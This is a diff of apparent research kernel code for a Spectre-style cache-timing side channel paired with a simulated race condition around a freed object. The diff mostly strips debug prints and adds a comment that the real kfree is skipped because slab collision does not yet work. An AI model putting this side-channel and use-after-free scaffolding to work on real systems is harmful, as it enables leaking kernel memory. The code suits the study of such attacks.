@@ -100,12 +100,8 @@ char spectre_read(void)
         {
             c = j;
             flush(&buf[j * L3_CACHE_LINE_SIZE]);
-            //printk("Hit timing %d --> j == %c\n", timing, j);
-            // printf("j: %d\n", j);
             break;
         }
-
-        //printk("Miss timing %d\n", timing);
     }
 
     return c;
@@ -135,7 +131,6 @@ void realloc(void)
 
 int section_critical(char* arg)
 {
-    //printk("2. crit section\n");
     int x = 0;
     if (likely(mutex_trylock(&lock) == 1))
     { 
@@ -143,23 +138,25 @@ int section_critical(char* arg)
         a_st = v_st;
         local_irq_enable();
         //kfree(v_st);
+        /*
+            If we actually do the kfree here we run into trouble during slab
+            consolidation and the kernel will error.
+
+            We would have to actually get the slab collision working,
+            which is a tricky process with its entirely own line of research
+        */
+
         x = 32980354234;
 
         /*
-            Simulate kfree()'s irq enable spot
+            Simulate kfree()'s irq enable
         */
-       
-        //for (int i = 0; i < 1000; i++)
-        //{
-        //    x *= i;
-        //}
         v_st = NULL;
         mutex_unlock(&lock);
         freed = 1;
         printk("released!\n");
     }
-    
-    //printk("end crit section\n");
+
     return x;
 }
 
